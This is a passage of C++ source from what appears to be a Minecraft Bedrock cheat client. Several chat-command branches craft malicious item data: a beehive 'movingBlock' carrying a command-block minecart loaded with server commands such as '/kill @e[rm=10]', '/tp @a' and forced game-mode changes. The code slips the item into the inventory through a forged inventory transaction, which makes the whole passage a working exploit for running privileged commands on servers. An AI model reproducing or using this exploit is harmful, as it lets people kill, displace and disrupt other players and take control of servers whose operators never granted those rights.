ctorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{Command:" "\" /gamemode s @p " "\",Ticking:1b,TicksLeftToStay:-1,definitions:[" "\"+minecraft:leash_knot" "\"]}}],CanDestory:[grass],ShouldSpawnBees:0b,id:\"Beehive\"}}}";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	if (args->at(1) == "gma") {
		std::string tag = "{CanPlaceOn:[\"birch_pressure_plate\",\"jungle_pressure_plate\",\"dark_oak_pressure_plate\",\"spruce_pressure_plate\",\"dark_oak_button\",\"carved_pumpkin\",\"jungle_button\",\"stone_slab3\",\"granite_stairs\",\"andesite_stairs\",\"double_stone_slab3\",\"acacia_button\",\"birch_button\",\"spruce_button\",\"turtle_egg\",\"stone_slab4\",\"double_stone_slab4\",\"diorite_stairs\",\"polished_granite_stairs\",\"polished_diorite_stairs\",\"polished_andesite_stairs\",\"mossy_stone_brick_stairs\",\"smooth_red_sandstone_stairs\",\"smooth_sandstone_stairs\",\"blast_furnace\",\"barrel\",\"birch_standing_sign\",\"smooth_quartz_stairs\",\"smoker\",\"end_brick_stairs\",\"birch_wall_sign\",\"darkoak_standing_sign\",\"spruce_wall_sign\",\"darkoak_wall_sign\",\"spruce_standing_sign\",\"normal_stone_stairs\",\"jungle_wall_sign\",\"red_nether_brick_stairs\",\"jungle_standing_sign\",\"acacia_wall_sign\",\"mossy_cobblestone_stairs\",\"acacia_standing_sign\",\"loom\",\"campfire\",\"bee_nest\",\"wither_rose\",\"beehive\",\"dispenser\",\"sandstone\",\"bed\",\"web\",\"tallgrass\",\"wool\",\"iron_block\",\"deadbush\",\"brown_mushroom\",\"gold_block\",\"red_mushroom\",\"brick_block\",\"mossy_cobblestone\",\"mob_spawner\",\"torch\",\"tnt\",\"bookshelf\",\"redstone_wire\",\"diamond_ore\",\"lever\",\"ladder\",\"diamond_block\",\"crafting_table\",\"cactus\",\"snow_layer\",\"snow\",\"jukebox\",\"clay\",\"soul_sand\",\"glowstone\",\"cake\",\"fence\",\"netherrack\",\"trapdoor\",\"nether_wart\",\"blue_ice\",\"nether_brick\",\"melon_block\",\"monster_egg\",\"vine\",\"mycelium\",\"enchanting_table\",\"stonebrick\",\"beacon\",\"fence_gate\",\"waterlily\",\"nether_brick_fence\",\"brewing_stand\",\"cauldron\",\"tripWire\",\"flower_pot\",\"dragon_egg\",\"emerald_ore\",\"end_portal_frame\",\"tripwire_hook\",\"dropper\",\"end_stone\",\"emerald_block\",\"cobblestone_wall\",\"skull\",\"anvil\",\"seaLantern\",\"stained_hardened_clay\",\"quartz_block\",\"redstone_block\",\"slime\",\"hopper\",\"log2\",\"iron_trapdoor\",\"prismarine\",\"hay_block\",\"carpet\",\"hardened_clay\",\"coal_block\",\"red_sandstone\",\"spruce_fence_gate\",\"jungle_fence_gate\",\"birch_fence_gate\",\"grass_path\",\"dark_oak_fence_gate\",\"chorus_flower\",\"acacia_fence_gate\",\"end_bricks\",\"end_rod\",\"red_nether_brick\",\"purpur_block\",\"magma\",\"nether_wart_block\",\"chorus_plant\",\"concrete\",\"bone_block\",\"concretePowder\",\"stonecutter_block\",\"coral\",\"coral_fan_dead\",\"coral_block\",\"coral_fan\",\"wooden_pressure_plate\",\"stone_pressure_plate\",\"acacia_pressure_plate\",\"light_weighted_pressure_plate\",\"heavy_weighted_pressure_plate\",\"grass\",\"double_plant\",\"stone\",\"cobblestone\",\"planks\",\"dirt\",\"sapling\",\"bedrock\",\"sand\",\"gravel\",\"gold_ore\",\"log\",\"coal_ore\",\"sponge\",\"lapis_ore\",\"iron_ore\",\"lapis_block\",\"dark_oak_trapdoor\",\"sea_pickle\",\"bamboo\",\"lectern\",\"barrier\",\"dried_kelp_block\",\"scaffolding\",\"birch_trapdoor\",\"kelp\",\"seagrass\",\"acacia_trapdoor\",\"jungle_trapdoor\",\"spruce_trapdoor\",\"smooth_stone\",\"grindstone\",\"cartography_table\",\"smithing_table\",\"bell\",\"fletching_table\",\"composter\",\"lantern\",\"wood\",\"honeycomb_block\",\"honey_block\",\"leaves\",\"nether_brick_stairs\",\"brick_stairs\",\"activator_rail\",\"spruce_stairs\",\"ender_chest\",\"stone_brick_stairs\",\"sandstone_stairs\",\"wooden_slab\",\"powered_comparator\",\"quartz_stairs\",\"dark_oak_stairs\",\"standing_banner\",\"wooden_button\",\"daylight_detector\",\"birch_stairs\",\"unpowered_comparator\",\"jungle_stairs\",\"trapped_chest\",\"double_wooden_slab\",\"stained_glass_pane\",\"leaves2\",\"acacia_stairs\",\"packed_ice\",\"wall_banner\",\"red_sandstone_stairs\",\"stone_slab2\",\"double_stone_slab2\",\"spruce_door\",\"shulker_box\",\"white_glazed_terracotta\",\"blue_glazed_terracotta\",\"black_glazed_terracotta\",\"gray_glazed_terracotta\",\"purpur_stairs\",\"jungle_door\",\"purple_glazed_terracotta\",\"magenta_glazed_terracotta\",\"yellow_glazed_terracotta\",\"lime_glazed_terracotta\",\"light_blue_glazed_terracotta\",\"cyan_glazed_terracotta\",\"pink_glazed_terracotta\",\"dark_oak_door\",\"acacia_door\",\"brown_glazed_terracotta\",\"birch_door\",\"orange_glazed_terracotta\",\"silver_glazed_terracotta\",\"green_glazed_terracotta\",\"red_glazed_terracotta\",\"prismarine_stairs\",\"prismarine_bricks_stairs\",\"observer\",\"stained_glass\",\"dark_prismarine_stairs\",\"stone_slab\",\"double_stone_slab\",\"obsidian\",\"detector_rail\",\"golden_rail\",\"yellow_flower\",\"glass\",\"red_flower\",\"oak_stairs\",\"furnace\",\"chest\",\"standing_sign\",\"rail\",\"stone_stairs\",\"wooden_door\",\"ice\",\"iron_door\",\"powered_repeater\",\"brown_mushroom_block\",\"wall_sign\",\"unlit_redstone_torch\",\"redstone_torch\",\"redstone_ore\",\"stone_button\",\"pumpkin\",\"lit_pumpkin\",\"unpowered_repeater\",\"red_mushroom_block\",\"iron_bars\",\"glass_pane\"],Count:1b,Name:\"minecraft:movingBlock\",tag:{movingBlock:{name:\"minecraft:air\",states:{}}movingEntity:{Occupants:[{ActorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{Command:" "\" /gamemode a @p " "\",Ticking:1b,TicksLeftToStay:-1,definitions:[" "\"+minecraft:leash_knot" "\"]}}],CanDestory:[grass],ShouldSpawnBees:0b,id:\"Beehive\"}}}";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	//kick
	if (args->at(1) == "kick") {
		std::string tag = "{CanPlaceOn:[\"birch_pressure_plate\",\"jungle_pressure_plate\",\"dark_oak_pressure_plate\",\"spruce_pressure_plate\",\"dark_oak_button\",\"carved_pumpkin\",\"jungle_button\",\"stone_slab3\",\"granite_stairs\",\"andesite_stairs\",\"double_stone_slab3\",\"acacia_button\",\"birch_button\",\"spruce_button\",\"turtle_egg\",\"stone_slab4\",\"double_stone_slab4\",\"diorite_stairs\",\"polished_granite_stairs\",\"polished_diorite_stairs\",\"polished_andesite_stairs\",\"mossy_stone_brick_stairs\",\"smooth_red_sandstone_stairs\",\"smooth_sandstone_stairs\",\"blast_furnace\",\"barrel\",\"birch_standing_sign\",\"smooth_quartz_stairs\",\"smoker\",\"end_brick_stairs\",\"birch_wall_sign\",\"darkoak_standing_sign\",\"spruce_wall_sign\",\"darkoak_wall_sign\",\"spruce_standing_sign\",\"normal_stone_stairs\",\"jungle_wall_sign\",\"red_nether_brick_stairs\",\"jungle_standing_sign\",\"acacia_wall_sign\",\"mossy_cobblestone_stairs\",\"acacia_standing_sign\",\"loom\",\"campfire\",\"bee_nest\",\"wither_rose\",\"beehive\",\"dispenser\",\"sandstone\",\"bed\",\"web\",\"tallgrass\",\"wool\",\"iron_block\",\"deadbush\",\"brown_mushroom\",\"gold_block\",\"red_mushroom\",\"brick_block\",\"mossy_cobblestone\",\"mob_spawner\",\"torch\",\"tnt\",\"bookshelf\",\"redstone_wire\",\"diamond_ore\",\"lever\",\"ladder\",\"diamond_block\",\"crafting_table\",\"cactus\",\"snow_layer\",\"snow\",\"jukebox\",\"clay\",\"soul_sand\",\"glowstone\",\"cake\",\"fence\",\"netherrack\",\"trapdoor\",\"nether_wart\",\"blue_ice\",\"nether_brick\",\"melon_block\",\"monster_egg\",\"vine\",\"mycelium\",\"enchanting_table\",\"stonebrick\",\"beacon\",\"fence_gate\",\"waterlily\",\"nether_brick_fence\",\"brewing_stand\",\"cauldron\",\"tripWire\",\"flower_pot\",\"dragon_egg\",\"emerald_ore\",\"end_portal_frame\",\"tripwire_hook\",\"dropper\",\"end_stone\",\"emerald_block\",\"cobblestone_wall\",\"skull\",\"anvil\",\"seaLantern\",\"stained_hardened_clay\",\"quartz_block\",\"redstone_block\",\"slime\",\"hopper\",\"log2\",\"iron_trapdoor\",\"prismarine\",\"hay_block\",\"carpet\",\"hardened_clay\",\"coal_block\",\"red_sandstone\",\"spruce_fence_gate\",\"jungle_fence_gate\",\"birch_fence_gate\",\"grass_path\",\"dark_oak_fence_gate\",\"chorus_flower\",\"acacia_fence_gate\",\"end_bricks\",\"end_rod\",\"red_nether_brick\",\"purpur_block\",\"magma\",\"nether_wart_block\",\"chorus_plant\",\"concrete\",\"bone_block\",\"concretePowder\",\"stonecutter_block\",\"coral\",\"coral_fan_dead\",\"coral_block\",\"coral_fan\",\"wooden_pressure_plate\",\"stone_pressure_plate\",\"acacia_pressure_plate\",\"light_weighted_pressure_plate\",\"heavy_weighted_pressure_plate\",\"grass\",\"double_plant\",\"stone\",\"cobblestone\",\"planks\",\"dirt\",\"sapling\",\"bedrock\",\"sand\",\"gravel\",\"gold_ore\",\"log\",\"coal_ore\",\"sponge\",\"lapis_ore\",\"iron_ore\",\"lapis_block\",\"dark_oak_trapdoor\",\"sea_pickle\",\"bamboo\",\"lectern\",\"barrier\",\"dried_kelp_block\",\"scaffolding\",\"birch_trapdoor\",\"kelp\",\"seagrass\",\"acacia_trapdoor\",\"jungle_trapdoor\",\"spruce_trapdoor\",\"smooth_stone\",\"grindstone\",\"cartography_table\",\"smithing_table\",\"bell\",\"fletching_table\",\"composter\",\"lantern\",\"wood\",\"honeycomb_block\",\"honey_block\",\"leaves\",\"nether_brick_stairs\",\"brick_stairs\",\"activator_rail\",\"spruce_stairs\",\"ender_chest\",\"stone_brick_stairs\",\"sandstone_stairs\",\"wooden_slab\",\"powered_comparator\",\"quartz_stairs\",\"dark_oak_stairs\",\"standing_banner\",\"wooden_button\",\"daylight_detector\",\"birch_stairs\",\"unpowered_comparator\",\"jungle_stairs\",\"trapped_chest\",\"double_wooden_slab\",\"stained_glass_pane\",\"leaves2\",\"acacia_stairs\",\"packed_ice\",\"wall_banner\",\"red_sandstone_stairs\",\"stone_slab2\",\"double_stone_slab2\",\"spruce_door\",\"shulker_box\",\"white_glazed_terracotta\",\"blue_glazed_terracotta\",\"black_glazed_terracotta\",\"gray_glazed_terracotta\",\"purpur_stairs\",\"jungle_door\",\"purple_glazed_terracotta\",\"magenta_glazed_terracotta\",\"yellow_glazed_terracotta\",\"lime_glazed_terracotta\",\"light_blue_glazed_terracotta\",\"cyan_glazed_terracotta\",\"pink_glazed_terracotta\",\"dark_oak_door\",\"acacia_door\",\"brown_glazed_terracotta\",\"birch_door\",\"orange_glazed_terracotta\",\"silver_glazed_terracotta\",\"green_glazed_terracotta\",\"red_glazed_terracotta\",\"prismarine_stairs\",\"prismarine_bricks_stairs\",\"observer\",\"stained_glass\",\"dark_prismarine_stairs\",\"stone_slab\",\"double_stone_slab\",\"obsidian\",\"detector_rail\",\"golden_rail\",\"yellow_flower\",\"glass\",\"red_flower\",\"oak_stairs\",\"furnace\",\"chest\",\"standing_sign\",\"rail\",\"stone_stairs\",\"wooden_door\",\"ice\",\"iron_door\",\"powered_repeater\",\"brown_mushroom_block\",\"wall_sign\",\"unlit_redstone_torch\",\"redstone_torch\",\"redstone_ore\",\"stone_button\",\"pumpkin\",\"lit_pumpkin\",\"unpowered_repeater\",\"red_mushroom_block\",\"iron_bars\",\"glass_pane\"],Count:1b,Name:\"minecraft:movingBlock\",tag:{movingBlock:{name:\"minecraft:air\",states:{}}movingEntity:{Occupants:[{ActorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{Command:" "\" /gamemode a @[rm=10] " "\",Ticking:1b,TicksLeftToStay:-1,definitions:[" "\"+minecraft:leash_knot" "\"]}}],CanDestory:[grass],ShouldSpawnBees:0b,id:\"Beehive\"}}}";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	//kill
	if (args->at(1) == "kill") {
		std::string tag = "{CanPlaceOn:[\"birch_pressure_plate\",\"jungle_pressure_plate\",\"dark_oak_pressure_plate\",\"spruce_pressure_plate\",\"dark_oak_button\",\"carved_pumpkin\",\"jungle_button\",\"stone_slab3\",\"granite_stairs\",\"andesite_stairs\",\"double_stone_slab3\",\"acacia_button\",\"birch_button\",\"spruce_button\",\"turtle_egg\",\"stone_slab4\",\"double_stone_slab4\",\"diorite_stairs\",\"polished_granite_stairs\",\"polished_diorite_stairs\",\"polished_andesite_stairs\",\"mossy_stone_brick_stairs\",\"smooth_red_sandstone_stairs\",\"smooth_sandstone_stairs\",\"blast_furnace\",\"barrel\",\"birch_standing_sign\",\"smooth_quartz_stairs\",\"smoker\",\"end_brick_stairs\",\"birch_wall_sign\",\"darkoak_standing_sign\",\"spruce_wall_sign\",\"darkoak_wall_sign\",\"spruce_standing_sign\",\"normal_stone_stairs\",\"jungle_wall_sign\",\"red_nether_brick_stairs\",\"jungle_standing_sign\",\"acacia_wall_sign\",\"mossy_cobblestone_stairs\",\"acacia_standing_sign\",\"loom\",\"campfire\",\"bee_nest\",\"wither_rose\",\"beehive\",\"dispenser\",\"sandstone\",\"bed\",\"web\",\"tallgrass\",\"wool\",\"iron_block\",\"deadbush\",\"brown_mushroom\",\"gold_block\",\"red_mushroom\",\"brick_block\",\"mossy_cobblestone\",\"mob_spawner\",\"torch\",\"tnt\",\"bookshelf\",\"redstone_wire\",\"diamond_ore\",\"lever\",\"ladder\",\"diamond_block\",\"crafting_table\",\"cactus\",\"snow_layer\",\"snow\",\"jukebox\",\"clay\",\"soul_sand\",\"glowstone\",\"cake\",\"fence\",\"netherrack\",\"trapdoor\",\"nether_wart\",\"blue_ice\",\"nether_brick\",\"melon_block\",\"monster_egg\",\"vine\",\"mycelium\",\"enchanting_table\",\"stonebrick\",\"beacon\",\"fence_gate\",\"waterlily\",\"nether_brick_fence\",\"brewing_stand\",\"cauldron\",\"tripWire\",\"flower_pot\",\"dragon_egg\",\"emerald_ore\",\"end_portal_frame\",\"tripwire_hook\",\"dropper\",\"end_stone\",\"emerald_block\",\"cobblestone_wall\",\"skull\",\"anvil\",\"seaLantern\",\"stained_hardened_clay\",\"quartz_block\",\"redstone_block\",\"slime\",\"hopper\",\"log2\",\"iron_trapdoor\",\"prismarine\",\"hay_block\",\"carpet\",\"hardened_clay\",\"coal_block\",\"red_sandstone\",\"spruce_fence_gate\",\"jungle_fence_gate\",\"birch_fence_gate\",\"grass_path\",\"dark_oak_fence_gate\",\"chorus_flower\",\"acacia_fence_gate\",\"end_bricks\",\"end_rod\",\"red_nether_brick\",\"purpur_block\",\"magma\",\"nether_wart_block\",\"chorus_plant\",\"concrete\",\"bone_block\",\"concretePowder\",\"stonecutter_block\",\"coral\",\"coral_fan_dead\",\"coral_block\",\"coral_fan\",\"wooden_pressure_plate\",\"stone_pressure_plate\",\"acacia_pressure_plate\",\"light_weighted_pressure_plate\",\"heavy_weighted_pressure_plate\",\"grass\",\"double_plant\",\"stone\",\"cobblestone\",\"planks\",\"dirt\",\"sapling\",\"bedrock\",\"sand\",\"gravel\",\"gold_ore\",\"log\",\"coal_ore\",\"sponge\",\"lapis_ore\",\"iron_ore\",\"lapis_block\",\"dark_oak_trapdoor\",\"sea_pickle\",\"bamboo\",\"lectern\",\"barrier\",\"dried_kelp_block\",\"scaffolding\",\"birch_trapdoor\",\"kelp\",\"seagrass\",\"acacia_trapdoor\",\"jungle_trapdoor\",\"spruce_trapdoor\",\"smooth_stone\",\"grindstone\",\"cartography_table\",\"smithing_table\",\"bell\",\"fletching_table\",\"composter\",\"lantern\",\"wood\",\"honeycomb_block\",\"honey_block\",\"leaves\",\"nether_brick_stairs\",\"brick_stairs\",\"activator_rail\",\"spruce_stairs\",\"ender_chest\",\"stone_brick_stairs\",\"sandstone_stairs\",\"wooden_slab\",\"powered_comparator\",\"quartz_stairs\",\"dark_oak_stairs\",\"standing_banner\",\"wooden_button\",\"daylight_detector\",\"birch_stairs\",\"unpowered_comparator\",\"jungle_stairs\",\"trapped_chest\",\"double_wooden_slab\",\"stained_glass_pane\",\"leaves2\",\"acacia_stairs\",\"packed_ice\",\"wall_banner\",\"red_sandstone_stairs\",\"stone_slab2\",\"double_stone_slab2\",\"spruce_door\",\"shulker_box\",\"white_glazed_terracotta\",\"blue_glazed_terracotta\",\"black_glazed_terracotta\",\"gray_glazed_terracotta\",\"purpur_stairs\",\"jungle_door\",\"purple_glazed_terracotta\",\"magenta_glazed_terracotta\",\"yellow_glazed_terracotta\",\"lime_glazed_terracotta\",\"light_blue_glazed_terracotta\",\"cyan_glazed_terracotta\",\"pink_glazed_terracotta\",\"dark_oak_door\",\"acacia_door\",\"brown_glazed_terracotta\",\"birch_door\",\"orange_glazed_terracotta\",\"silver_glazed_terracotta\",\"green_glazed_terracotta\",\"red_glazed_terracotta\",\"prismarine_stairs\",\"prismarine_bricks_stairs\",\"observer\",\"stained_glass\",\"dark_prismarine_stairs\",\"stone_slab\",\"double_stone_slab\",\"obsidian\",\"detector_rail\",\"golden_rail\",\"yellow_flower\",\"glass\",\"red_flower\",\"oak_stairs\",\"furnace\",\"chest\",\"standing_sign\",\"rail\",\"stone_stairs\",\"wooden_door\",\"ice\",\"iron_door\",\"powered_repeater\",\"brown_mushroom_block\",\"wall_sign\",\"unlit_redstone_torch\",\"redstone_torch\",\"redstone_ore\",\"stone_button\",\"pumpkin\",\"lit_pumpkin\",\"unpowered_repeater\",\"red_mushroom_block\",\"iron_bars\",\"glass_pane\"],Count:1b,Name:\"minecraft:movingBlock\",tag:{movingBlock:{name:\"minecraft:air\",states:{}}movingEntity:{Occupants:[{ActorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{Command:" "\" /kill @e[rm=10] " "\",Ticking:1b,TicksLeftToStay:-1,definitions:[" "\"+minecraft:leash_knot" "\"]}}],CanDestory:[grass],ShouldSpawnBees:0b,id:\"Beehive\"}}}";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	//tp
	if (args->at(1) == "tp") {
		std::string tag = "{CanPlaceOn:[\"birch_pressure_plate\",\"jungle_pressure_plate\",\"dark_oak_pressure_plate\",\"spruce_pressure_plate\",\"dark_oak_button\",\"carved_pumpkin\",\"jungle_button\",\"stone_slab3\",\"granite_stairs\",\"andesite_stairs\",\"double_stone_slab3\",\"acacia_button\",\"birch_button\",\"spruce_button\",\"turtle_egg\",\"stone_slab4\",\"double_stone_slab4\",\"diorite_stairs\",\"polished_granite_stairs\",\"polished_diorite_stairs\",\"polished_andesite_stairs\",\"mossy_stone_brick_stairs\",\"smooth_red_sandstone_stairs\",\"smooth_sandstone_stairs\",\"blast_furnace\",\"barrel\",\"birch_standing_sign\",\"smooth_quartz_stairs\",\"smoker\",\"end_brick_stairs\",\"birch_wall_sign\",\"darkoak_standing_sign\",\"spruce_wall_sign\",\"darkoak_wall_sign\",\"spruce_standing_sign\",\"normal_stone_stairs\",\"jungle_wall_sign\",\"red_nether_brick_stairs\",\"jungle_standing_sign\",\"acacia_wall_sign\",\"mossy_cobblestone_stairs\",\"acacia_standing_sign\",\"loom\",\"campfire\",\"bee_nest\",\"wither_rose\",\"beehive\",\"dispenser\",\"sandstone\",\"bed\",\"web\",\"tallgrass\",\"wool\",\"iron_block\",\"deadbush\",\"brown_mushroom\",\"gold_block\",\"red_mushroom\",\"brick_block\",\"mossy_cobblestone\",\"mob_spawner\",\"torch\",\"tnt\",\"bookshelf\",\"redstone_wire\",\"diamond_ore\",\"lever\",\"ladder\",\"diamond_block\",\"crafting_table\",\"cactus\",\"snow_layer\",\"snow\",\"jukebox\",\"clay\",\"soul_sand\",\"glowstone\",\"cake\",\"fence\",\"netherrack\",\"trapdoor\",\"nether_wart\",\"blue_ice\",\"nether_brick\",\"melon_block\",\"monster_egg\",\"vine\",\"mycelium\",\"enchanting_table\",\"stonebrick\",\"beacon\",\"fence_gate\",\"waterlily\",\"nether_brick_fence\",\"brewing_stand\",\"cauldron\",\"tripWire\",\"flower_pot\",\"dragon_egg\",\"emerald_ore\",\"end_portal_frame\",\"tripwire_hook\",\"dropper\",\"end_stone\",\"emerald_block\",\"cobblestone_wall\",\"skull\",\"anvil\",\"seaLantern\",\"stained_hardened_clay\",\"quartz_block\",\"redstone_block\",\"slime\",\"hopper\",\"log2\",\"iron_trapdoor\",\"prismarine\",\"hay_block\",\"carpet\",\"hardened_clay\",\"coal_block\",\"red_sandstone\",\"spruce_fence_gate\",\"jungle_fence_gate\",\"birch_fence_gate\",\"grass_path\",\"dark_oak_fence_gate\",\"chorus_flower\",\"acacia_fence_gate\",\"end_bricks\",\"end_rod\",\"red_nether_brick\",\"purpur_block\",\"magma\",\"nether_wart_block\",\"chorus_plant\",\"concrete\",\"bone_block\",\"concretePowder\",\"stonecutter_block\",\"coral\",\"coral_fan_dead\",\"coral_block\",\"coral_fan\",\"wooden_pressure_plate\",\"stone_pressure_plate\",\"acacia_pressure_plate\",\"light_weighted_pressure_plate\",\"heavy_weighted_pressure_plate\",\"grass\",\"double_plant\",\"stone\",\"cobblestone\",\"planks\",\"dirt\",\"sapling\",\"bedrock\",\"sand\",\"gravel\",\"gold_ore\",\"log\",\"coal_ore\",\"sponge\",\"lapis_ore\",\"iron_ore\",\"lapis_block\",\"dark_oak_trapdoor\",\"sea_pickle\",\"bamboo\",\"lectern\",\"barrier\",\"dried_kelp_block\",\"scaffolding\",\"birch_trapdoor\",\"kelp\",\"seagrass\",\"acacia_trapdoor\",\"jungle_trapdoor\",\"spruce_trapdoor\",\"smooth_stone\",\"grindstone\",\"cartography_table\",\"smithing_table\",\"bell\",\"fletching_table\",\"composter\",\"lantern\",\"wood\",\"honeycomb_block\",\"honey_block\",\"leaves\",\"nether_brick_stairs\",\"brick_stairs\",\"activator_rail\",\"spruce_stairs\",\"ender_chest\",\"stone_brick_stairs\",\"sandstone_stairs\",\"wooden_slab\",\"powered_comparator\",\"quartz_stairs\",\"dark_oak_stairs\",\"standing_banner\",\"wooden_button\",\"daylight_detector\",\"birch_stairs\",\"unpowered_comparator\",\"jungle_stairs\",\"trapped_chest\",\"double_wooden_slab\",\"stained_glass_pane\",\"leaves2\",\"acacia_stairs\",\"packed_ice\",\"wall_banner\",\"red_sandstone_stairs\",\"stone_slab2\",\"double_stone_slab2\",\"spruce_door\",\"shulker_box\",\"white_glazed_terracotta\",\"blue_glazed_terracotta\",\"black_glazed_terracotta\",\"gray_glazed_terracotta\",\"purpur_stairs\",\"jungle_door\",\"purple_glazed_terracotta\",\"magenta_glazed_terracotta\",\"yellow_glazed_terracotta\",\"lime_glazed_terracotta\",\"light_blue_glazed_terracotta\",\"cyan_glazed_terracotta\",\"pink_glazed_terracotta\",\"dark_oak_door\",\"acacia_door\",\"brown_glazed_terracotta\",\"birch_door\",\"orange_glazed_terracotta\",\"silver_glazed_terracotta\",\"green_glazed_terracotta\",\"red_glazed_terracotta\",\"prismarine_stairs\",\"prismarine_bricks_stairs\",\"observer\",\"stained_glass\",\"dark_prismarine_stairs\",\"stone_slab\",\"double_stone_slab\",\"obsidian\",\"detector_rail\",\"golden_rail\",\"yellow_flower\",\"glass\",\"red_flower\",\"oak_stairs\",\"furnace\",\"chest\",\"standing_sign\",\"rail\",\"stone_stairs\",\"wooden_door\",\"ice\",\"iron_door\",\"powered_repeater\",\"brown_mushroom_block\",\"wall_sign\",\"unlit_redstone_torch\",\"redstone_torch\",\"redstone_ore\",\"stone_button\",\"pumpkin\",\"lit_pumpkin\",\"unpowered_repeater\",\"red_mushroom_block\",\"iron_bars\",\"glass_pane\"],Count:1b,Name:\"minecraft:movingBlock\",tag:{movingBlock:{name:\"minecraft:air\",states:{}}movingEntity:{Occupants:[{ActorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{Command:" "\" /tp @a ~ ~ ~ " "\",Ticking:1b,TicksLeftToStay:-1,definitions:[" "\"+minecraft:leash_knot" "\"]}}],CanDestory:[grass],ShouldSpawnBees:0b,id:\"Beehive\"}}}";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	//day
	if (args->at(1) == "day") {
		std::string tag = "{CanPlaceOn:[\"birch_pressure_plate\",\"jungle_pressure_plate\",\"dark_oak_pressure_plate\",\"spruce_pressure_plate\",\"dark_oak_button\",\"carved_pumpkin\",\"jungle_button\",\"stone_slab3\",\"granite_stairs\",\"andesite_stairs\",\"double_stone_slab3\",\"acacia_button\",\"birch_button\",\"spruce_button\",\"turtle_egg\",\"stone_slab4\",\"double_stone_slab4\",\"diorite_stairs\",\"polished_granite_stairs\",\"polished_diorite_stairs\",\"polished_andesite_stairs\",\"mossy_stone_brick_stairs\",\"smooth_red_sandstone_stairs\",\"smooth_sandstone_stairs\",\"blast_furnace\",\"barrel\",\"birch_standing_sign\",\"smooth_quartz_stairs\",\"smoker\",\"end_brick_stairs\",\"birch_wall_sign\",\"darkoak_standing_sign\",\"spruce_wall_sign\",\"darkoak_wall_sign\",\"spruce_standing_sign\",\"normal_stone_stairs\",\"jungle_wall_sign\",\"red_nether_brick_stairs\",\"jungle_standing_sign\",\"acacia_wall_sign\",\"mossy_cobblestone_stairs\",\"acacia_standing_sign\",\"loom\",\"campfire\",\"bee_nest\",\"wither_rose\",\"beehive\",\"dispenser\",\"sandstone\",\"bed\",\"web\",\"tallgrass\",\"wool\",\"iron_block\",\"deadbush\",\"brown_mushroom\",\"gold_block\",\"red_mushroom\",\"brick_block\",\"mossy_cobblestone\",\"mob_spawner\",\"torch\",\"tnt\",\"bookshelf\",\"redstone_wire\",\"diamond_ore\",\"lever\",\"ladder\",\"diamond_block\",\"crafting_table\",\"cactus\",\"snow_layer\",\"snow\",\"jukebox\",\"clay\",\"soul_sand\",\"glowstone\",\"cake\",\"fence\",\"netherrack\",\"trapdoor\",\"nether_wart\",\"blue_ice\",\"nether_brick\",\"melon_block\",\"monster_egg\",\"vine\",\"mycelium\",\"enchanting_table\",\"stonebrick\",\"beacon\",\"fence_gate\",\"waterlily\",\"nether_brick_fence\",\"brewing_stand\",\"cauldron\",\"tripWire\",\"flower_pot\",\"dragon_egg\",\"emerald_ore\",\"end_portal_frame\",\"tripwire_hook\",\"dropper\",\"end_stone\",\"emerald_block\",\"cobblestone_wall\",\"skull\",\"anvil\",\"sea